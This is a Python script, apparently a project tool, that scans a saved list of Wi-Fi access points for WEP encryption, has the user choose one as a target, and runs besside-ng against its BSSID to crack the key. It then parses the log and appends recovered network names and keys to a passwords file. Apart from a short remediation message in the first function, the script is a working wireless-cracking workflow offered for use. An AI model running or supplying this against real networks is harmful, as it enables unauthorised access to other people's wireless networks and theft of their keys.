import subprocess, time, csv, sys, shutil, os, re

def identify_wep():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Vulnerability: Uses WEP encryption, which is outdated and easily cracked.")
                    print("Remediation: Upgrade to WPA3 or at least WPA2 encryption.\n")
            else:
                print("No vulnerable access points found using WEP encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wep_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    wep_aps.append(row)

            if wep_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wep_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")

                # Assuming the selection process is outside of this function, as it would need user input.
                # User should replace `selected_index` with the actual selection mechanism, e.g., input from the user.
                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wep_aps):
                    selected_ap = wep_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning ESSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WEP encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def main(ap_mac, interface):
    # Hard coded channel for the project; don't have time to set dynamically
    channel = "6"
    log_file_path = "/mnt/data/wepcrack.log"
    
    # Prepare the command to run besside-ng and capture its output
    command = ["besside-ng", "-c", channel, "-b", ap_mac, interface, "-v"]
    
    # Ensure the log file exists or create it
    try:
        with open(log_file_path, 'a'):
            pass
    except IOError as e:
        print(f"Failed to prepare log file: {e}")
        return
    
    # Execute the command and write the output to both the terminal and the log file
    with open(log_file_path, 'a') as log_file:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())
                log_file.write(output)
    
    # Parse the log file to extract the SSID and key
    parse_and_save_key(log_file_path)

def parse_and_save_key(log_file_path):
    ssid, key = None, None
    password_file_path = "/mnt/data/passwords.txt"
    
    # Read the log file and grep for the key line
    with open(log_file_path, 'r') as file:
        for line in file:
            if "Got key for" in line:
                # Example line: [01:46:05] Got key for wifi-old [11:bb:33:cd:55] 20031 IVs
                match = re.search(r"Got key for (\S+) \[(\S+)\]", line)
                if match:
                    ssid, key = match.groups()
                    break
    
    # Save the SSID and key to the passwords file
    if ssid and key:
        try:
            with open(password_file_path, 'a') as file:
                file.write(f"{ssid},{key}\n")
        except IOError as e:
            print(f"Failed to save the password: {e}")
